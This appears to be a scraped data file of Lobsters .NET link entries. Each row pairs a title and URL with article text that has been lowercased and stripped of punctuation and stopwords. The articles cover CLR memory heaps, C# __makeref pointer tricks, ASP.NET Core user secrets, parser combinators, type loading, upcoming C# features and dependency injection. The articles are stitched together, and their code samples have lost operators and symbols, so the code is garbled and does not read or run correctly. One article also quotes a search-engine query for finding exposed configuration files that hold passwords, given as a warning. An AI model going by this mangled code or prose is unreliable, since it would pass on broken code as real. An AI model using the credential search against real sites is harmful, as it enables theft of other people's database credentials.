eeclass classloader lookup table get allocated lowfrequencyheap stubheap host stub facilitate code access security ca com wrapper call pinvoke one main place see highlowfrequency access heart type system different data item either classified hot highfrequency cold lowfrequency key data structure section botr page type loader design eeclass methodtable data split hot cold structure improve working set cache utilization methodtable meant store hot data needed program steady state eeclass store cold data typically needed type loading jiting reflection methodtable point one eeclass listed specific example heap type used general loader heap listed allocated loaderallocator init function link actual code executable stub heap executable flag set rest size heap configured code reserve different amount front commit size equivalent one o page addition general heap others specifically used virtual stub dispatch mechanism known indcellheap cacheentryheap lookupheap dispatchheap resolveheap allocated code using specified commitreserve size finally interested mechanic heap actually work take look loaderheapcpp jit memory usage last mean least one component clr extensively allocates memory jit main scenario transient temporary memory needed job converting il code machine code permanent memory used need emit machine code method transient memory needed jit job converting il code machine code current cpu architecture memory needed whilst jit running reuseddiscarded later used hold internal jit data structure eg compiler basicblock gentreestmt etc example take look following code compiler fgvaluenumber allocate value number store assert fgvnpassescompleted vnstore nullptr fgvnpassescompleted compallocator allocator new cmkvaluenumber compallocator cmkvaluenumber vnstore new cmkvaluenumber valuenumstore allocator line vnstore new cmkvaluenumber end calling specialised new operator defined compilerhpp code shown per comment us customer arena allocator implemented srcjitalloccpp operator new note compgetmem arena allocator return memory zeroinitialized contain data prior allocation lifetime also requires sz aligned multiple sizeof int inline void cdecl operator new sizet sz compiler context compmemkind cmk sz alignup sz sizeof int assert sz sz sizeof int return context compgetmem sz cmk technique overriding new operator used lot place throughout clr instance generic one implemented clr host permanent memory last type memory jit us permanent memory store jitted machine code done via call compiler compgetmem starting compiler compcompile via callstack shown note us customer arena allocator implemented srcjitalloccpp clrjit clrallocinprocessheap clrjit arenaallocator allocatehostmemory clrjit arenaallocator allocatenewpage clrjit arenaallocator allocatememory clrjit compiler compgetmem clrjit emitter emitgetmem clrjit emitter emitallocinstr clrjit emitter emitnewinstrtiny clrjit emitter emitinsrr clrjit emitter emitinsbinary clrjit codegen gencodeforstorelclvar clrjit codegen gencodefortreenode clrjit codegen gencodeforbblist clrjit codegen gengeneratecode clrjit compiler compcompile realworld example finally prove investigation match realworld scenario see similar memory usage breakdown github issue question reduce memory consumption coreclr yes profiled several xamarin gui application tizen mobile typical profile coreclr memory gui application following mapped assembly image megabyte jitcompiler memory megabyte execution engine megabyte code heap megabyte type information megabyte object heap megabyte discus post hackernews reading see link additional information loader heap
389,Lobsters,dotnet,"C#, F#, .NET programming",Fun With __makeref,http://benbowen.blog/post/fun_with_makeref/,fun makeref,view code fullscreen reference c typedreference method view code fullscreen documented officially supported m marshalptrtostructure marshalstructuretoptr view code fullscreen blittable marshalsizeof people sitting buggy code bug code view code fullscreen bugfree view code fullscreen view code fullscreen,c list keywords evergrowing also set four hidden dark keywords language since earliest day many people aware keywords arglist makeref reftype refvalue view code fullscreen hidden keywords today looking makeref two companion keywords reftype refvalue wo nt looking arglist today makeref c keyword could thought treated like global standalone function take value return reference like reference c fact using makeref return typedreference lesswellknown bcl struct net typedreference use two relevant keywords reftyperefvalue work reftype return systemtype value reference also method typedreference personally though prefer stay consistent use three builtin keywords together finally refvalue either return value referenced given typedreference set value said typedreference case nt make much sense yet example showcasing three keywords int x var xref makeref x consolewriteline reftype xref print consolewriteline refvalue xref int print refvalue xref int consolewriteline refvalue xref int print view code fullscreen makeref et al demonstration notice refvalue specify type xref reference int case actually programmer benefit retain type safety runtime throw invalidcastexception try treat xref reference float example well firstly let talk use keywords answer fairly simple almost never use keywords think fairly obvious case reason make possible write unsafe buggy code see colleague go mad searching function makeref scope could funny though resharper nt recognise documented officially supported m said ported net core surprising amount code wild us case ai nt worth giant disclaimer way let explore interesting quite people lamented lack generic pointer c would look something akin generic method class although might seem like niche requirement huge use working native interop code example imagine collection like std vector allocated c whose element want able access c way build generic way access element c ie sort nativevector even interop using pointer generic together desirable pure c example building fast offheap collection like io ring buffer wellknown workaround build small library emit collection method il generic pointer possible people try use marshalptrtostructure marshalstructuretoptr method marshal class however firstly time slower machine method show exaggeration measured importantly nt work way many people expect example sizeof mystruct may number byte copied read function marshal class name implies marshal data c equivalent also responsible reduced performance moving let look typedreference struct bit closer fact two field pointer variable supplied makeref actual reference internal pointer represents type variable took reference value pointer first field struct heavy unsafe abuse use pointer via typedreference demonstration implementation two method writegenerictoptr readgenericfromptr method write read generic struct type tofrom pointer respectively explained code linebyline underneath methodimpl methodimploptionsaggressiveinlining public static void writegenerictoptr intptr dest value int sizeoft struct byte byteptr byte dest typedreference valueref makeref value byte valueptr byte intptr valueref int sizeoft byteptr valueptr methodimpl methodimploptionsaggressiveinlining public static readgenericfromptr intptr source int sizeoft struct byte byteptr byte source result default typedreference resultref makeref result byte resultptr byte intptr resultref int sizeoft resultptr byteptr return result view code fullscreen writegenerictoptr readgenericfromptr explanation writegenerictoptr methodimpl methodimploptionsaggressiveinlining tell compilerjit given method inlined whenever possible public static void writegenerictoptr intptr dest value int sizeoft struct function declaration dest pointer copy value struct sizeoft size struct copy byte constrain struct type relying behaviour value type copied rather passedbyreference later also sort manipulation reference type nt really often make much sense context c byte byteptr byte dest casting dest byte use later typedreference valueref makeref value line get reference value would like valueptr value thing allowed c byte valueptr byte intptr valueref nasty unsafe abuse mentioned earlier first getting pointer valueref reference reference treating pointer intptr instead pointer typedreference work first byte typedreference struct specifically pointer value dereference intptr pointer regular old intptr finally cast intptr byte use copy code finally loop int sizeoft loop byte value copy dest pointer remember valueptr byte point start value current stack got pointer making typedreference value makeref taking pointer contained within reference point value readgenericfromptr public static readgenericfromptr intptr source int sizeoft struct function declaration time source pointer copy data sizeoft size data byte byte byteptr byte source cast use forloop later result default way allocating enough byte stack u copy serve return value moment typedreference resultref makeref result line similar get reference result would like resultptr result byte resultptr byte intptr resultref exactly idea behind similar line write method getting pointer result time forloop int sizeoft loop byte source data copy result looking code first thought oh god simply like point code like fundamental interop native collection building fast unmanaged data structure example using two method build nativearray type wrap pointer first element c datablock array work blittable struct type boilerplate required anyway alternative write emit code il always preferable blog post makeref go figure good thinking ahead might wonder sizeoft parameter meant come sizeof nt work c mentioned way get size generic c struct type runtime sizeof simply wo nt compile people opt using marshalsizeof like people sitting buggy code let try makeref interest brevity gon na show crux implementation using makeref first warning anyone scanning page code bug code code example fix feeling like challenge see figure bug public static int sizeof struct tarray new var makeref tarray var makeref tarray intptr intptr intptr intptr return int byte byte view code fullscreen sizeof implementation bug talk bug let talk code work first line make new array structs type two element length next two line make reference first second element array via makeref mean typedreferences representing reference corresponding struct tarray put simply reference tarray reference tarray next two line get actual pointer typedreferences using trick used writegenerictoptrreadgenericfromptr finally last line measure difference byte two pointer give u size struct type array element guaranteed contiguous c therefore measuring distance start first element array start second calculate size first element subsequently element type mentioned bug get well tarray normal array allocated managed heap like array c know memory managed heap subject whim garbage collector includes moved think might happen gc pause application move array get get point beginning array moment ago point second element array moved needle say measuring distance two pointer definitely give u valid value size need fix also allocating gcable memory stuff little unnecessary sometimes type measuring primitive let add little precheck amended bugfree slightlykinderongcwhenusingprimitivetypes code public static int sizeof struct type type typeof typecode typecode typegettypecode type switch typecode case typecodeboolean return sizeof bool case typecodechar return sizeof char case typecodesbyte return sizeof sbyte case typecodebyte return sizeof byte case return sizeof short case return sizeof ushort case return sizeof int case return sizeof uint case return sizeof long case return sizeof ulong case typecodesingle return sizeof float case typecodedouble return sizeof double case typecodedecimal return sizeof decimal case typecodedatetime return sizeof datetime default tarray new gchandle tarraypinned gchandlealloc tarray gchandletypepinned try typedreference makeref tarray typedreference makeref tarray intptr intptr intptr intptr return int byte byte finally tarraypinnedfree view code fullscreen sizeof implementation fixed finally going go much detail one us limited though use converting texel structs game engine way freely converting two structs size nothing new code following explanation understandable able understand methodimpl methodimploptionsaggressiveinlining public static tout reinterpret tin tout tin curvalue int sizebytes tin struct tout struct tout result default tout typedreference resultref makeref result byte resultptr byte intptr resultref typedreference curvalueref makeref curvalue byte curvalueptr byte intptr curvalueref int sizebytes resultptr curvalueptr return result view code fullscreen reinterpret casting implementation short allows u treat struct instance though instance another example working two identical point structs two different library rapidly cast one using anyway folk hope enjoyed try come back around something general next one edit jan recently net core set method added allow write lot trick discussed post fullysupported manner see following rtm github commit information http
391,Lobsters,dotnet,"C#, F#, .NET programming",Keeping secrets in ASP.NET Core,http://www.blinkingcaret.com/2017/06/21/keeping-secrets-in-asp-net-core/,keeping secret aspnet core,configurationbuilder new configuration api user secret documentation microsoft azure key vault documentation,thing want make public aspnet project best example database credential often find configuration file plain text website live easy end situation webconfig file store sensitive data end indexed search engine usually due bad configuration becomes extremely easy find someone know search trick example google filetype config connectionstring password many example people inadvertently made credential public similar search github yield similar result thinking type thing never happen maybe right ending situation exposed credential easier think example development easy checkin code company private repo credential mistake especially beginning new project trying thing might use username password connect local database almost everyone us password one place making available coworkers good idea thankfully aspnet core introduced new way handling configuration information one private information code live together good thing configurationbuilder aspnet core introduced new configuration api enables several source configuration value configuration value nothing namevalue pair example reading list namevalue pair file named appsettingsjson iconfiguration configuration new configurationbuilder setbasepath thepathtowhereappsettingsis addjsonfile appsettingsjson build string connectionstring configuration connectionstring using configuration api aspnet core project namely startupcs file access instance ihostingenvironment property named contentroot use basepath new configuration api neat feature example string connectionstring configuration database connectionstring return value stored connectionstring database database connectionstring connectionstring even though improvement old static configurationmanager class still solve problem secret file need checked source control user secret come user secret one feature new configuration api several source namevalue pair different priority example create iconfiguration instance first read value environment variable exists try appsettingsjson iconfiguration configuration new configurationbuilder setbasepath thepathtowhereappsettingsis addjsonfile appsettingsjson addenvironmentvariables build last source added one highest priority case environment variable user secret one source work tool allows manage secret command line start using user secret first install nuget package enables adding user secret source configurationbuilder dotnet add package microsoftextensionsconfigurationusersecrets edit csproj file enable command line tool first add value usersecretsid propertygroup propertygroup targetframework targetframework usersecretsid auniquestring usersecretsid propertygroup added propertygroup one defines targetframework create new propertygroup add wish another change add reference command line tool using generate secret inside itemgroup add itemgroup dotnetclitoolreference include microsoftextensionssecretmanagertools version itemgroup create new itemgroup add dotnetclitoolreference statement existing one unfortunately know way enable user secret command line dotnet cli tool involve manually editing csproj file also memorize version number believe case even using full version visual studio using visual studio code change making sure restored nuget package write command line dotnet usersecrets see help screen use user secret go create user secret let first enable configurationbuilder iconfiguration configuration new configurationbuilder setbasepath thepathtowhereappsettingsis addjsonfile appsettionsjson addusersecrets startup addenvironmentvariables build important part added addusersecrets startup startup startup class aspnet core class assembly defines value usersecretsid finally create user secret example connectionstring write command line dotnet usersecrets set connectionstring connection string remove dotnet usersecrets remove connectionstring list secret dotnet usersecrets list clear dotnet usersecrets clear user secret saved json file located appdata microsoftusersecrets usersecretsid secretsjson window microsoftusersecrets usersecretsid secretsjson linux mac file encrypted reason warning documentation saying use production applies environment variable even though case recommended productionready solution microsoft azure key vault use azure want pay azure key vault either encrypt secret find another solution currently know recommend also mention right end documentation hint user secret might encrypted future last quick note using user secret change value user secret project us running change visible restart project related
392,Lobsters,dotnet,"C#, F#, .NET programming",What the heck is a parser-combinator?,http://www.kimpel.com/2017/02/28/what-the-heck-is-a-parser-combinator/,heck parsercombinator,background basic scala fastparse li haoyi fastparse link wikipedia parsercombinator using c net building external dsl c git real world haskell using parsec library monad c conclusion,background basic recent project engagement assigned job migrate cobolbased mainframe application new environment core theme specifically project follows rehosting approach reasoning type approach agreed upon customer mainly due time cost course scope effort transformation quite huge many task involved complete application run completely different platform activity include migrating database flat file network database etc data common data store microsoft sql server replatforming cobol source code commodity hardware running virtualized environment using micro focus adjusting db access layer reflect change redesign batch processing job control list really task involved post want focus jcl job control language portion managed transform script new environment idea keep scripting fashion chose microsoft powershell target platform time cost mind typically want reduce effort much one way achieve automation minimize manual effort much possible came idea automatically translating jcl statement corresponding least similar m powershell command first started spreadsheet created list majority jcl statement tried understand main purpose behind statement used looked pattern statement meaningful way implementing future platform scala fastparse achieved started think easy flexible way translate jcl powershell idea born use parser understand jcl script colleague presented interesting project li haoyi named fastparse fastparse parsercombinator library scala let quickly easily write recursive descent text binary data parser scala li also wrote great post parsing using parsercombinators link short parsercombinator much powerful way parsing structured text data structure great advantage simple regular expression since find pattern also return contextual information paragraph back custom structure wikipedia lot additional information interested matter fact really simple easy use library create scala script read jcl file convert powershell script high degree automatic translation give example sample line jcl code note note comment written tell typical jcl line always start sign first column actual command start column column starting column content command case actual comment note step identify process line code would look like read line code jcl use regular expression find suitable pattern note section identified parse line code using corresponding fastparse clause convert equivalent m powershell command fastparse clause used scala library look like val note p note note val noteclause p start dollar w note w identifier anycharrep end syntax highlight clause enclosed start end statement w simply one whitespaces note specified another clause since upper lower case identifier look actual content store variable make use later exclamation mark specifies required anycharrep specifies character repetitive fashion clause executed like val success notestmt index noteclauseparse line notestmt null println format notestmt first line actually executes fastparse clause case success return actual note notestmt variable printed new file powershell file created earlier script simple println statement show real power tool par content also return one many even including list structured information back easy clever way another example run val p start dollar w run w rufile equal identifier rep sep comma anycharrep end val success runoptions index line runoptions null runopt runoptions folder filename available runopt first line show original jcl command run command allows script execute external file ie typically cobol program rufile option tell command cobol program located folder filename see fastparse clause definition folder filename structure simply repetitive identifier specification separator specified sign executing clause folder filename stored runopt variable simply loop parsercombinator using c net mentioned fastparse library scala great love simple yet powerful way creating parsercombinator environment however key background passion microsoft development stack always wondered whether something similar c net framework little bit research investigation found couple interesting tool library building external dsl c interesting blog creating external dsl domain specific language blog seems pretty outdated however source control git tiny c monadic parser framework quite uptodate real world haskell using parsec focus haskell approach also quite interesting implementation net library monad c c library monad full set parsercombinators based haskell parsec library listed tool library found first interesting work wanted accomplish reused lot sprache implementation created jcl powershell logic top look like step took implement custom logic created new console app demo purpose could use project type reused library functionality like parse parser result etc logic added new class called main program actually read source file line code source parsed processed approach pretty similar scala fastparse however clause implementation bit different c code sample transformation look like global envment dev public static readonly parser jclcommand jcltext open parsechar parsechar many command parsecharexcept many text parsechar many content parsecharexcept many text select new jclcommand command content public static readonly parser jclcommand globaltext variablename parsecharexcept many text parsechar openbrack parsechar filepath parsecharexcept many text closebrack parsechar select new jclcommand variablename filepath first line sample jcl statement actually defines global variable named envment assigns value dev using jcltext c clause first determine actual jcl command used along option parameter specified c call clause quite simple yet powerful var p jcltexttryparse line pwassuccessful tryparse method take line code try parse successful know valid jcl type statement process ignore matter comment line powershell positive case use globaltext clause parse option section global command see definition quite straight forward code look variable name sign content section ie example typically looking file path specified global variable enclosed bracket source actually implement logic simple var globalval globaltexttryparse pvaluecontent globalvalwassuccessful sbappend stringformat globalvalvaluecommand globalvalvaluecontent n globalsadd globalvalvaluecommandtolower else sbappend line n using stringbuilder actually create new powershell script finally written new file case parse job successful append p logic stringbuilder sb comment section also write target file regularly tracking purpose future state sme validate happening old new world globalsadd command simply add name global variable hashset easily reference global variable subsequent section powershell script conclusion leveraging parsercombinators extremely powerful reduces amount code implemented looking expression process content way another recommend tool library since typically quite easy implement add much value interesting see similarity different programming language enormous learning curve quite low fastparse syntax defining clause look cleaner visually observable however best part awesome parsercombinator approach really appreciated actual project also available favorite development stack net happy parsing let know question
393,Lobsters,dotnet,"C#, F#, .NET programming",How the .NET Runtime loads a Type,http://www.mattwarren.org/2017/06/15/How-the-.NET-Rutime-loads-a-Type/,net runtime load type,net runtime load type carefully cautiously stepbystep ensuring type safety type safety security wellbehaved following rule compiler prevents creating abstract class class created writing il code hand il assembler tool ilasm check creating type runtime blog post formatterservices class typesafety check loading type stepbystep type loader design botr loader progress incremental step fill structure information finally arrives fully loaded type b info sourcecode comment classloader doincrementalload dispatch loop switch statement definition fileloadcreate domainfile ctor fileloadbegin begin fileloadfindnativeimage findnativeimage fileloadverifynativeimagedependencies verifynativeimagedependencies fileloadallocate allocate fileloadadddependencies adddependencies fileloadpreloadlibrary preloadlibrary fileloadloadlibrary loadlibrary fileloadpostloadlibrary postloadlibrary fileloadeagerfixups eagerfixups fileloadvtablefixups vtablefixups fileloaddeliverevents deliversyncevents fileloaded finishload classloadbegin classloadunrestoredtypekey classloadunrestored classloadapproxparents classloadexactparents classdependenciesloaded classloaded fileloadverifyexecution verifyexecution fileactive activate build debug version coreclr relevant configuration knob carefully cautiously stepbystep hackernews rprogramming,net runtime load type jun word something take granted every time run net program turn loading type class fairly complex process net runtime clr actually load type want tl dr done carefully cautiously stepbystep ensuring type safety one key requirement managed runtime providing type safety actually mean msdn page type safety security typesafe code access memory location authorized access discussion type safety specifically refers memory type safety confused type safety broader respect example typesafe code read value another object private field access type welldefined allowable way effect clr ensure typesclasses wellbehaved following rule compiler prevents creating abstract class let look concrete example using c code public abstract class abstractclass public abstractclass public class normalclass abstractclass public normalclass public static void main string args var test new abstractclass compiler quite rightly refuse compile give following error abstract class created inherit error create instance abstract class interface consoleapplicationabstractclass well good clr rely code created via wellbehaved compiler fact via compiler check prevent attempt create abstract class writing il code hand one way circumvent compiler write il code hand using il assembler tool ilasm almost check validity il give instance il equivalent writing var test new abstractclass c compiler would let u method public hidebysig static void main string args cil managed entrypoint maxstack local init class consoleapplicationnormalclass systeminvalidoperationexception instance abstract class created newobj instance void consoleapplicationabstractclass ctor callvirt instance class mscorlib systemtype mscorlib systemobject gettype callvirt instance string mscorlib systemreflectionmemberinfo getname call void mscorlib internalconsole writeline string ret fortunately clr got covered throw invalidoperationexception execute code due check hit jit compiles newobj il instruction creating type runtime one way attempt create abstract class runtime using reflection thanks blog post giving tip way creating type shown code var abstracttype typegettype consoleapplicationabstractclass consolewriteline abstracttypefullname systemmissingmethodexception create abstract class var abstractinstance activatorcreateinstance abstracttype compiler completely happy anything prevent warn however run code throw exception strangely enough missingmethodexception time job call stack one final way unless missed use getuninitializedobject formatterservices class like public static object createinstance type type var constructor typegetconstructor new type constructor null typeisvaluetype throw new notsupportedexception type typefullname nt parameterless constructor var emptyinstance formatterservicesgetuninitializedobject type constructor null return null return constructorinvoke emptyinstance new object emptyinstance var abstracttype typegettype consoleapplicationabstractclass consolewriteline abstracttypefullname systemmemberaccessexception create abstract class var abstractinstance createinstance abstracttype runtime stop however time decides throw memberaccessexception happens via following call stack typesafety check check one example runtime validate creating type many thing deal instance loading type stepbystep seen clr multiple check loading type load stepbystep well nutshell circular reference recursion particularly dealing generic type take code section load level type loader design botr classa c b classb c classc valid type class depends class b vice versa load know b valid load b sure valid classic deadlock runtime get round well botr page loader initially creates structure representing type initializes data obtained without loading type nodependencies work done structure referred place usually sticking pointer another structure loader progress incremental step fill structure information finally arrives fully loaded type example base type b approximated something include type substituted real thing later also info load type stage stepbystep ensuring dependant type reached stage continuing class load stage shown image explained detail helpful sourcecode comment yay opensourcing coreclr different level handled classloader doincrementalload method contains switch statement deal turn however part bigger process control loading entire file also known module assembly net terminology entire process handled another dispatch loop switch statement work fileloadlevel enum definition reality whole process loading assembly look like loading one type happens substeps module reached fileloaded stage fileloadcreate domainfile ctor fileloadbegin begin fileloadfindnativeimage findnativeimage fileloadverifynativeimagedependencies verifynativeimagedependencies fileloadallocate allocate fileloadadddependencies adddependencies fileloadpreloadlibrary preloadlibrary fileloadloadlibrary loadlibrary fileloadpostloadlibrary postloadlibrary fileloadeagerfixups eagerfixups fileloadvtablefixups vtablefixups fileloaddeliverevents deliversyncevents fileloaded finishload classloadbegin classloadunrestoredtypekey classloadunrestored classloadapproxparents classloadexactparents classdependenciesloaded classloaded fileloadverifyexecution verifyexecution fileactive activate see action build debug version coreclr enable relevant configuration knob simple hello world program get log output shown loader message correspond fileloadxxx stage phasedload message indicate classloadxxx step also see event happen time include creation static variable static threadstatics thread static prestubworker indicates method prepared jitter full output part reference programexe modulesclassses peimage opened hmodule c storefile add cached entry pefile assembly c loader program load initiated loadedloaded loader program loading level begin loader program loading level findnativeimage loader program loading level verifynativeimagedependencies loader program loading level allocate static allocating static module program loaded pmodule c module program static allocating byte precomputed static module c loaderallocator storefile storeassembly add cached entry pefile load level allocate domainfile ad success loader program loading level adddependencies completed load level adddependencies domainfile ad success loader program loading level preloadlibrary loader program loading level loadlibrary loader program loading level postloadlibrary loader program loading level eagerfixups loader program loading level vtable fixups loader program loading level deliverevents drct isready wait getlasterror drct isready wait getlasterror la load assembly c completed load level deliverevents domainfile ad success loader program loading level loaded completed load level loaded domainfile ad success loader program load completed loaded prestubworker systemenvironment setcommandlineargs prestubworker method dorunclassinit request init appdomain runclassinit calling class contructor type prestubworker systemenvironment cctor prestubworker method dorunclassinit request init appdomain dorunclassinit returning success init appdomain runclassinit returned successfully class contructor type dorunclassinit returning success init appdomain phasedload loadtypehandlefortypekey type consoleapplicationprogram level loaded phasedload table contains loadtypehandle loading class module token phasedload creating loading entry type consoleapplicationprogram phasedload incremental load type consoleapplicationprogram level begin looking systemobject name loading class consoleapplicationprogram module c domain sd mt methoditerator created systemobject eec imd consoleapplicationprogram cctor eec imd consoleapplicationprogram ctor eec imd consoleapplicationprogram main static placing static consoleapplicationprogram static field placed non gc offset offset static field placed non gc offset offset static static field byte needed normal non dynamic case static placing threadstatics consoleapplicationprogram thread static field placed non gc offset offset thread static field placed non gc offset offset static threadstatic field byte needed normal non dynamic case classloader appdomainagileattribute consoleapplicationprogram methodtablebuilder finished method table module token phasedload incremental load type consoleapplicationprogram level approxparents notify consoleapplicationprogram successfully loaded class consoleapplicationprogram phasedload completed full dependency load type consoleapplicationprogram phasedload completed full dependency load type consoleapplicationprogram loader program load initiated activeactive loader program loading level verifyexecution loader program loading level active completed load level active domainfile ad success loader program load completed active prestubworker consoleapplicationprogram main prestubworker method prestubworker calling makejitworker callcompilemethodwithsehwrapper called gv looking systemconsole name sd mt methoditerator created systemconsole jitcomplete completed successfully got callcompile methodwithsehwrapper methoddesc makejitworker finished stub dorunclassinit request init appdomain runclassinit calling class contructor type prestubworker consoleapplicationprogram cctor prestubworker method prestubworker calling makejitworker callcompilemethodwithsehwrapper called gv jitcomplete completed successfully got callcompile methodwithsehwrapper methoddesc makejitworker finished stub clr load classestypes carefully cautiously stepbystep discus post hackernews rprogramming always link like find information
394,Lobsters,dotnet,"C#, F#, .NET programming",C# 7.x and 8.0: Uncertainty and Awesomeness,https://www.erikheemskerk.nl/c-sharp-7-2-and-8-0-uncertainty-awesomeness/,c uncertainty awesomeness,new feature microsoft planned next version c c readonly reference blittables reflike type build presentation asynchronous sequence c proposal rx project bart de smet blog asynchronous dispose c extension everything c proposal slide shown presentation record c default interface implementation c must virtual without breaking backwards compatibility nullable reference type sir tony hoare code contract fody nullguard summary roslyn site github,last week wrote new feature microsoft planned next version c version let also take look thing planned bit strap rather long read c nextup version c language le clearly defined c focused enabling write lowlevel code without resort unsafe keyword feature already defined like readonly reference blittables reflike type c picture even le clear roadmap slide build presentation mention next step pattern matching presentation also touch feature thinking c let look think pretty exciting much term planning releasing many thing still uncertain feature might change might make asynchronous sequence c c async await know however one scenario left unsupported enumeration know foreach order use foreach entirety linq result asynchronous method either retrieve result asynchronously content fact enumeration asynchronous proposal support language would look something like iasyncenumerable searchresult result searchenginegetallresults query foreach await var result result look simple enough proper support would also support linq query operator pretty large body code could probably use lot work rx project lot official documentation bart de smet blog interesting information lot scenario like querying database data provider would also support scenario probably quite time third party data provider start supporting looking oracle official oracle driver day support asynchronous operation never mind async method returning task even support old beginend pattern asynchronous operation regardless third party buyin feature need order really useful daytoday code nice see way asynchronously stream large set item unknown size like example twitter feed right retrieve feed page page implementation detail twitter client using represented code asynchronous sequence abstract away detail nice asynchronous dispose c let say desktop application directly connecting database yes know go along example begin transaction start lot work asynchronously block ui course transaction initialized using statement exception occurs neatly disposed case database transaction mean rolled back transaction affected large number record rolling back might take since dispose synchronous call mean user interface frozen happening yes something like idbtransaction transaction null try transaction connectionbegintransaction important work transactioncommit finally await taskrun transactiondispose basically hacking around shortcoming disposable pattern feature proposed point c would make lot easier using await var transaction connectionbegintransaction important work transactioncommit usefulness feature probably depends lot third party buyin interface added extension everything c one pretty excited already able write extension method extend class functionality without modify though able add static method property kind proposal add new syntax defining extension make possible add feature suggests anything type obvious one thing like instance property static method property slide shown presentation also show static field although slide mention proposal mention would eventually able support instance field using class supporting instance field would mean would able attach whole new set feature existing object without modify without object able interfere functionality sound nice reservation one hand would cleaner easier eye using composition hand like extension method sometimes always clear happening looking code pretty much need ide able figure something extension probably best use feature sparingly really make sense syntax look bit javaish typescriptish remember final might still improve extension enrollee extends person static field static dictionary person professor enrollee new dictionary person professor instance method public void enroll professor supervisor enrollee supervisor instance property public professor supervisor enrolleestrygetvalue var supervisor supervisor null static property public static icollection person student enrolleeskeys instance constructor public person string name professor supervisor name thisenroll supervisor direct transcription slide build talk record c short awesome record type nothing collection field specify type name field compiler tedious work implementing right way syntax simple class person string first string last see compiler expands see boilerplate longer implement class person iequatable person public string first get public string last get public person string first string last thisfirst first thislast last public void deconstruct string first string last first thisfirst last thislast public bool equal person null equal first otherfirst equal last otherlast public override bool equal object person equal true public override int gethashcode first gethashcode last gethashcode getvalueordefault public person string first thisfirst string last thislast new person first last line code write order get nicely functioning dto class often say best line code one write default interface implementation c feature introduced pretty skeptical would ever add implementation interface use abstract class case made presentation pretty good one however let look logging library two perspective namely client application writing log message third party extension library implementing new feature like logging ftp yes know stupid idea go along full interface look like public interface ilogger void log loglevel level string message void log loglevel level string format params obj argument void debug string message void debug string format params obj argument void information string message void information string format params obj argument void warning string message void warning string format params obj argument void error string message void error string format params obj argument client application perspective interesting method specific log level debug information warning error overload possibly log method also interesting le ftp logging feature perspective interesting method log loglevel string method method basically convenience overload method currently interface implementation ilogger must implement method interface add new method example void error exception ex string format params object argument broken contract implementation must changed also implement method default interface implementation define implementation overload interface log loglevel string method mandatory implement look like edited brevity public interface ilogger void log loglevel level string message void log loglevel level string format params object argument log level stringformat format argument void debug string message log logleveldebug message void debug string format params object argument log logleveldebug stringformat format argument technically work understand method actually implemented become virtual method interface implementation override chooses primary reason default interface implementation able extend interface without breaking backwards compatibility pretty good stuff nullable reference type concept null first introduced algol w language sir tony hoare famously described billion dollar mistake publicly apologized whether someone else introduced null debatable undeniable null reference error cause many error would great could make sure parameter property never assigned value null partial solution c using code contract fody nullguard community asking year firstclass solution problem suggested able mark type nullable using variable string would nullable string would attempt assign null nonnullable variable assign value nullable variable without checking null would get compiler error variable compiler could solve pretty easily parameter property would find way add extra metadata still case solve way like newing array element initially null would drastically change net type system would break lot existing code immediately reduced generating warning something might result null reference error c team chosen opposite marking variable nonnullable reference type become nonnullable default mark type variable nullsafe decorating similar nullable value type using nonnullable variable might null check yet result warning assigning value nullable variable one nonnullable look like bar nullable type string void foo string bar string baz bar generate warning baz nonnullable bar nullable checked bar null fix simply check null void foo string bar bar null throw new argumentnullexception nameof bar string baz bar behavior optin sure generate ton warning existing code base think great stride forward making c even safe language large part getting rid one prolific error software summary microsoft really stepping language enhancement great see transparent open something say change hop roslyn site github say make strong enough case might even effect change guy think new feature let know comment final word round new c feature
395,Lobsters,dotnet,"C#, F#, .NET programming",Community builds of Visual Studio Code for Chromebooks and Raspberry Pi,https://github.com/headmelted/codebuilds,community build visual studio code chromebooks raspberry pi,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
397,Lobsters,dotnet,"C#, F#, .NET programming",Don’t like dependency injection?,https://engineering.snagajob.com/dont-like-dependency-injection-898de93dc8d3,like dependency injection,snagajob java language c python scala good one tldr java enterprise edition di rebellion ibm oracle jboss redhat application server java enterprise edition jee spec interface unfortunately writing software standard terrible hello world spring framework book jee design setting object graph xml requiring interface absolutely everything hollywood grade magic hollywood principal better support setter member injection container requiring explicit configuration convention meta data based guice inject like convinced construct dependency service locator get instance locator statically concluding aop,snagajob regular tech talk recent one discussion merit dependency injection java world pattern standard many year true programming language simply fit language language community different narrative mean see merit pattern differentlyi think di good pattern c language currently use snagajob though also project written python scala instance hunch pattern big deal language compared java post like get think might historical reason would like set pattern exactly whether need framework spoiler probably good one alternative aretldr often discussion dependency injection people mix pattern supported container plenty criticize come many container core pattern easy appreciate instead letting object assemble dependency class state dependency require client order constructed usedwhile pattern simple quite large effect code organization done well positive one humble opinionthe java enterprise edition di rebellionuntil year ago substantial share java corporate community pushing java best choice developing enterprise application vendor ibm oracle sun oracle bea also oracle jboss redhat sold application server host software coded java enterprise edition jee spec interface providing value though packing server plethora feature like enabling live fine grained configuration monitoring application server specific goody like clustering exclusive library limitless scalability order make java attractive coder wide range skill say limitation made sure specification ide friendly could replace code drag drop interface wizard vision software engineering headed back consisted generation language commoditization high level software component eg ibm san francisco project would eventually replace programmer business analystsunfortunately writing software standard terrible need approximately interface implementation class configuration file implement hello world probably considered cutting corner quite enterprise standard back code needed triple wrapped zip file fancy extension meta data file packaged deployed via pipeline involved besides lot clicking clunky web interface also involved jumping flaming hoop package stamped rewrapped international committee astronaut architect wonder anything got built java yearsand along came spring framework spring clever rebellion jee providing alternative container model enabled user use plain object rather ejbs general provided much simpler programming model started companion code book jee design kept enough silly thing around like setting object graph xml requiring interface absolutely everything fly radar scale enterprise crowd actually focused empowering developer giving option instead limitation getting way developer need hand holding developer figured spring framework rocketed dominant position still hold todaywhile important selling point spring probably jee usual dependency injection core element spring basically put di map spring popular java framework ever since people java land simply used dependency injection default way wiring object togetherso coming java bubble somewhat shocked hear several people express distaste di may good reason believe di neat property well like go nexthollywood grade magicbefore dependency injection inversion control ioc read term ioc marketed umbrella term di fall remember di basically rebranding ioc regardless early article ioc di would mention hollywood principal call u call idea write class according particular interface able rely client properly construct initialize instance mean class need little knowledge environment operate neatly aligns aim like single responsibility principle encapsulationand really dependency injection simply mean follow agreed upon pattern writing class expect client environment class provide inject dependency requirebut two big flavor come di typically implemented property setter member injection constructor injectionsimple property based di look like public class windowwasher public soapbottle soapbottle set private get assumption relevant dependency set construction using class problem pattern without advanced container support clear property required set use guarantee client satisfy dependency trying use object dependency rely initializing object may even trickyinterface dependency try improve lack clarity pattern public interface iwindowwasher soapbottle 